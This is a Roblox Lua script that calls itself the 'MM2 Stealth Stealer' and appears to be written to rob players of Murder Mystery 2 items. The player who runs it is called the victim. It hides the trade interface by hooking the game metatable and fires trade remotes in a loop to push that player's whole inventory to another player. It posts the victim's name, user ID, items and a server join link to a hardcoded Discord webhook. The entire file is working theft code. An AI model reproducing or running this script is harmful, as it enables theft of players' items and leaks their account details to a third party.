-- ============================================================
-- MM2 STEALTH STEALER v2.0 - FINAL
-- Coded by CAT Shadow Hacker
-- GitHub: https://github.com/zaftral69-hub/MM2-Ultimate-Suite
-- ============================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local LocalPlayer = Players.LocalPlayer

-- ============================================================
-- CONFIG - YOUR WEBHOOK IS ALREADY SET
-- ============================================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw"

-- ============================================================
-- GET GAME INSTANCE ID
-- ============================================================
local function getGameInstanceId()
    local success, result = pcall(function()
        local data = TeleportService:GetLocalPlayerTeleportData()
        if data and data.instanceId then return data.instanceId end
        return nil
    end)
    if success and result then return result end
    
    local success2, response = pcall(function()
        return HttpService:GetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")
    end)
    if success2 and response then
        local data = HttpService:JSONDecode(response)
        for _, server in pairs(data.data) do
            if server.id == game.JobId then
                return server.instanceId or game.JobId
            end
        end
    end
    return game.JobId
end

-- ============================================================
-- BUILD WORKING JOIN LINK
-- ============================================================
local function buildJoinLink()
    return "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameId=" .. getGameInstanceId()
end

-- ============================================================
-- SEND DISCORD WEBHOOK
-- ============================================================
local function sendWebhook(content, embedData)
    local payload = { content = content or "✅ Script executed" }
    if embedData then payload.embeds = {embedData} end
    local body = HttpService:JSONEncode(payload)
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
    end)
end

-- ============================================================
-- GET VICTIM DATA
-- ============================================================
local function getVictimData()
    local inv = LocalPlayer:FindFirstChild("Inventory")
    local items = {}
    if inv then
        for _, item in pairs(inv:GetChildren()) do
            table.insert(items, item.Name)
        end
    end
    return {
        name = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        joinLink = buildJoinLink(),
        instanceId = getGameInstanceId(),
        placeId = game.PlaceId,
        itemCount = #items,
        items = items
    }
end

-- ============================================================
-- HIDE TRADE UI
-- ============================================================
local function hideTradeUI()
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if pg then
        for _, g in pairs(pg:GetChildren()) do
            if g:IsA("ScreenGui") and string.lower(g.Name):find("trade") then
                g:Destroy()
            end
        end
    end
    local oldMeta = getrawmetatable and getrawmetatable(game)
    if oldMeta then
        local oldNamecall = oldMeta.__namecall
        setreadonly(oldMeta, false)
        oldMeta.__namecall = newcclosure(function(self, ...)
            local args = {...}
            if args[1] == "StartTrade" or args[1] == "OpenTrade" or args[1] == "ShowTradeUI" then
                return nil
            end
            return oldNamecall(self, ...)
        end)
        setreadonly(oldMeta, true)
    end
end

-- ============================================================
-- FIND TRADE REMOTE
-- ============================================================
local function findTradeRemote()
    for _, container in pairs({ReplicatedStorage, game:GetService("ReplicatedFirst")}) do
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("RemoteEvent") and string.lower(obj.Name):find("trade") then
                return obj
            end
        end
    end
    return nil
end

-- ============================================================
-- FIND RICHEST TARGET
-- ============================================================
local function findRichestTarget()
    local target = nil
    local maxItems = 0
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("Humanoid") then
            local inv = plr:FindFirstChild("Inventory")
            if inv then
                local count = #inv:GetChildren()
                if count > maxItems then
                    maxItems = count
                    target = plr
                end
            end
        end
    end
    return target, maxItems
end

-- ============================================================
-- EXECUTE STEALTH TRADE
-- ============================================================
local function executeStealthTrade(target)
    local remote = findTradeRemote()
    if not remote then
        sendWebhook("❌ Trade Remote Not Found", { title = "Stealth Trade Failed", color = 0xff0000 })
        return
    end
    
    local inv = LocalPlayer:FindFirstChild("Inventory")
    local items = {}
    if inv then
        for _, item in pairs(inv:GetChildren()) do
            table.insert(items, item.Name)
        end
    end
    if #items == 0 then
        sendWebhook("📭 No Items Found", { title = "Stealth Trade Skipped", color = 0xffff00 })
        return
    end
    
    remote:FireServer("RequestTrade", target)
    wait(0.5)
    
    for i = 1, 30 do
        wait(0.1)
        remote:FireServer("AcceptTrade", target)
        remote:FireServer("ConfirmTrade", target)
        for _, itemName in pairs(items) do
            remote:FireServer("AddItem", itemName, target)
            wait(0.05)
        end
        remote:FireServer("CompleteTrade", target)
    end
    
    sendWebhook("💰 TRADE COMPLETED", {
        title = "Items Stolen",
        description = "**Victim:** " .. LocalPlayer.Name .. "\n**Items:** " .. table.concat(items, ", ") .. "\n**Total:** " .. #items .. " items",
        color = 0xff0000
    })
end

-- ============================================================
-- MAIN
-- ============================================================
local function main()
    if not game:IsLoaded() then game.Loaded:Wait() end
    hideTradeUI()
    
    local data = getVictimData()
    sendWebhook("🔗 **Public Server Join Link**", {
        title = "MM2 Victim Found",
        description = "**Victim:** " .. data.name .. "\n**User ID:** " .. data.userId .. "\n**Items:** " .. data.itemCount .. " weapons\n\n**CLICK THIS LINK TO JOIN:**\n" .. data.joinLink,
        color = 0x00ff00,
        fields = {
            { name = "📋 Instance ID", value = "`" .. data.instanceId .. "`", inline = true },
            { name = "🎯 Place ID", value = "`" .. data.placeId .. "`", inline = true }
        }
    })
    
    local target, count = findRichestTarget()
    if target then
        print("[CAT] 🎯 Targeting: " .. target.Name .. " (" .. count .. " items)")
        executeStealthTrade(target)
    else
        print("[CAT] ⚠️ No target found")
    end
    
    if setclipboard then
        setclipboard(data.joinLink)
        print("[CAT] 📋 Link copied to clipboard")
    end
    print("[CAT] ✅ Complete! Check Discord for join link.")
end

pcall(main)

while wait(60) do
    pcall(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end